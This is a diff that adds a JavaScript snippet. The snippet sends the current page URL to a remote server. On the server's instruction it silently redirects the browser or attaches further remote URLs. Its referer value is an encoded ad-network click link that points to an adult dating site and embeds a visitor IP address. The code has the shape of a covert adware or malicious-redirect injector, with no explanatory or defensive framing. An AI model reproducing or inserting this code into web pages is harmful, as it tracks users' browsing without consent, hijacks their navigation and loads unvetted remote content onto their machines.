@@ -1,0 +1,21 @@
+(function(w, domainPath, referer){
+  var doc_location = encodeURIComponent(w.location.toString());
+  w.ufApp.sendXMLGetRequest(domainPath + "/v1/rtr/check/" + w.location.hostname + '?referer=' + referer + '&doc_location=' + doc_location, function (err, response) {
+    if (err){
+      console.warn(err.message);
+      return;
+    }
+    if (response && response.data && response.data.solution && response.data.solution ==='redirect' && response.data.url){
+      w.location.replace(response.data.url);
+    }
+    if (w && w.ufApp && response && response.data && response.data.boUrl){
+      w.ufApp.attachBo(response.data.boUrl);
+    }
+    if (w && w.ufApp && response && response.data && response.data.soUrl){
+      w.ufApp.attachSo(response.data.soUrl);
+    }
+    if (w && w.ufApp && response && response.data && response.data.soGenUrl){
+      w.ufApp.attachSo(response.data.soGenUrl);
+    }
+  });
+})(window, "https://uf.noclef.com", "http://main.exosrv.com/click.php?data=IHwyMjkwMzU0fHxodHRwcyUzQSUyRiUyRmZsaXJ0LWZvci1zZXguY29tJTJGdGRzJTNGdGRzSWQlM0RnOTU4MGlzaF9yJTI2dGRzX2NhbXBhaWduJTNEZzk1ODBpc2glMjZ1dG1fc291cmNlJTNEZGRhJTI2dXRtX21lZGl1bSUzRG1vYiUyNnV0bV9jYW1wYWlnbiUzRGV4b2VfYm0lMjZ1dG1fdGVybSUzRG1vYl9pYW50X3VzYV9nOTU4MGlzaF8zMV9hbGwlMjZ1dG1fY29udGVudCUzRCU3QnZhcmlhdGlvbl9pZCU3RCUyNnAxJTNEJTdCc3JjX2hvc3RuYW1lJTdEJTI2cDUlM0QlN0J6b25lX2lkJTdEJTI2cDglM0QlN0J0aW1lJTdEJTI2cDklM0QlN0JjYXRlZ29yeV9pZCU3RCUyNnRyJTNEJTdCY29udmVyc2lvbnNfdHJhY2tpbmclN0R8fHwwfHwxNTQ3NDQyNzgzfGZyZWUxOC5uZXR8NzMuNTAuMjkuMjAzfHwyMTUyMjAzOHwyOTM4NTQwfDk3fHw0MXwxMnwxMnwwfDF8fDMwMHgxMDB8MXwwfDM3NXg2Njd8fDN8ODFkM2ZmMTczYzQxNTIwNmM4MzAyOGU1MTUxMjJiZWN8MXwwfG0uZnJlZTE4Lm5ldHwwfDB8MHwgIG0gZnJlZTE4IG5ldCAgfHwxfDB8MHwwfDB8NDg5Njg2MXwwfDQ5MTI2OTF8fHwwfDIwfHxPS3w3MjUyOTI0ZjI5NjBhODBmMzRiMDNiNjBhMmY2MDhhMw%3D%3D");
